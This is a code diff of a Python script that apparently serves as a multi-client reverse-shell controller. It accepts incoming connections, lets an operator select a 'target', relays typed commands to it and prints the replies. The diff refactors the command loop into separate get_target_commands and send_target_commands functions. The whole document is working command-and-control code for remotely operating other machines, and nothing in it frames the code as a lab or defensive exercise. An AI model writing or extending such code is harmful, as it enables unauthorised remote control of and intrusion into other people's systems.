@@ -84,10 +84,10 @@ def accept_connections():
     del CONNECTIONS[:]
     del IP_ADDRESSES[:]
 
-    while 1:
+    while True:
         try:
             conn, address = ss.accept()
-            conn.setblocking(True)
+            #conn.setblocking(True)
             CONNECTIONS.append(conn)
             IP_ADDRESSES.append(address)
             print(f"\n[*] Connection established: {address[0]}\n[+] > ", end="")
@@ -104,7 +104,7 @@ def client_connection():
         elif 'select' in cmd:
             conn = get_target(cmd)
             if conn is not None:
-                send_target_commands(conn)
+                get_target_commands(conn)
         else:
             print(f"[!] command not recognized: {cmd}")
 
@@ -134,19 +134,26 @@ def get_target(cmd):
         print(f"[!] {target} is not a valid selection")
         return None
 
-def send_target_commands(conn):
+def get_target_commands(conn):
     while True:
         try:
             cmd = input()
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(1024), "utf-8")
-                print(client_response, end="")
-                return client_response
             if cmd == 'exit':
-                print('')
-                #conn.close()
-                break
+                return
+            response = send_target_commands(cmd, conn)
+            print(response, end="")
         except:
-            print("[!] Connection to client was lost")
-            break
+            print('[!] Unknown error (get_target_commands)')
+
+def send_target_commands(cmd, conn):
+    try:
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            #print(client_response, end="")
+            return client_response
+            #conn.close()
+            #break 
+    except Exception:
+        print("[!] Connection to client was lost")
+        return
